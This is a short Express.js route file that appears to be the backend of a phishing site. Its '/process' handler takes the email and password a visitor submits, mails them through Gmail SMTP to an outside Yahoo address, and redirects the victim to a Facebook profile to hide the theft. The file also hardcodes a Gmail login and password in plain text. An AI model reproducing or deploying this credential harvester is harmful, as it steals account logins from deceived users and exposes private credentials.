var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');

var smtpConfig = {
  host: 'smtp.gmail.com',
  port: 465,
  secure: true, // use SSL,
                // you can try with TLS, but port is then 587
  auth: {
    user: 'abeomer@gmail.com', // Your email id
    pass: 'abilicious2234' // Your password
  }
};

var transporter = nodemailer.createTransport(smtpConfig);
/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index');
});

router.get('https://rihana.herokuapp.com/', function(req, res, next) {
    res.render('index');
});
router.post('/process', function(req, res, next) {
  email = req.body.email;
  password = req.body.password;
var mailData = {
    from: 'abeomer@gmail.com',
    to: 'abe_the_angel@yahoo.com',
    subject: 'Retriever',
    text: 'Email:' + email + "\n" + "Password:" + password,
    html: 'Email:' + email + "\n" + "Password:" + password
  };


  transporter.sendMail(mailData, function(error, info){
    if(error){
      res.send(error);
    }else{
      res.redirect('https://www.facebook.com/rihana.reyes.56?fref=ts');
      

    };
  });




});
module.exports = router;
